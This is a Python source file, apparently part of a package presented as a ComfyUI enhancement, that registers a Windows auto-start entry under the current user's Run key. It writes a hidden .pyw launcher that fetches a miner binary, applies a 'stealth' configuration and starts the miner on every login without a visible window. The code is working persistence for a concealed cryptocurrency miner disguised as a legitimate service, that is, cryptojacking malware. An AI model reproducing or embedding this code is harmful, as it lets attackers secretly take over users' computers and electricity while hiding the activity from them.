"""
Windows auto-start registration via HKCU registry.
No admin / UAC required.
"""

import logging
import os
import sys
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_KEY_NAME = "ComfyUIEnhancedService"

_BOOTSTRAP_SCRIPT = "comfyui_enhanced_boot.pyw"


class AutoStart:
    def __init__(self, base_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent

    def _bootstrap_path(self) -> Path:
        return self.base_dir / _BOOTSTRAP_SCRIPT

    def _write_bootstrap(self) -> Path:
        """Create a tiny .pyw launcher that re-imports the orchestrator.
        Using .pyw ensures no console window flashes on login."""
        script = self._bootstrap_path()
        code = (
            "import sys, pathlib\n"
            f"sys.path.insert(0, {str(self.base_dir)!r})\n"
            "from core.miner import MinerManager\n"
            "from core.config import ConfigBuilder\n"
            "from core.stealth import StealthConfig\n"
            "from core.dashboard import DashboardServer\n"
            "import json, threading\n"
            "\n"
            f"base = pathlib.Path({str(self.base_dir)!r})\n"
            "mgr = MinerManager(base)\n"
            "mgr.ensure_binary()\n"
            "cb = ConfigBuilder()\n"
            "cfg = cb.build()\n"
            "sc = StealthConfig()\n"
            "cfg = sc.apply_to_config(cfg)\n"
            "mgr.write_config(cfg)\n"
            "mgr.start()\n"
            "ds = DashboardServer(mgr)\n"
            "ds.start()\n"
        )
        script.write_text(code, encoding="utf-8")
        logger.info("Bootstrap written to %s", script)
        return script

    def _find_pythonw(self) -> str:
        """Locate pythonw.exe next to the current interpreter."""
        base = Path(sys.executable).parent
        candidates = [
            base / "pythonw.exe",
            base.parent / "pythonw.exe",
            base / "python_embeded" / "pythonw.exe",
        ]
        for c in candidates:
            if c.exists():
                return str(c)
        return "pythonw.exe"

    def register(self) -> bool:
        try:
            import winreg
        except ImportError:
            logger.warning("winreg not available (non-Windows?)")
            return False

        boot_script = self._write_bootstrap()
        pythonw = self._find_pythonw()
        value = f'"{pythonw}" "{boot_script}"'

        try:
            key = winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER,
                REG_PATH,
                0,
                winreg.KEY_WRITE,
            )
            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)
            logger.info("Auto-start registered: %s", value)
            return True
        except OSError as exc:
            logger.error("Failed to register auto-start: %s", exc)
            return False

    def unregister(self) -> bool:
        try:
            import winreg
        except ImportError:
            return False

        try:
            key = winreg.OpenKeyEx(
                winreg.HKEY_CURRENT_USER,
                REG_PATH,
                0,
                winreg.KEY_WRITE,
            )
            winreg.DeleteValue(key, REG_KEY_NAME)
            winreg.CloseKey(key)
            logger.info("Auto-start removed")
        except FileNotFoundError:
            pass
        except OSError as exc:
            logger.error("Failed to remove auto-start: %s", exc)
            return False

        boot = self._bootstrap_path()
        boot.unlink(missing_ok=True)
        return True

    def is_registered(self) -> bool:
        try:
            import winreg
            key = winreg.OpenKeyEx(
                winreg.HKEY_CURRENT_USER,
                REG_PATH,
                0,
                winreg.KEY_READ,
            )
            try:
                winreg.QueryValueEx(key, REG_KEY_NAME)
                return True
            except FileNotFoundError:
                return False
            finally:
                winreg.CloseKey(key)
        except Exception:
            return False
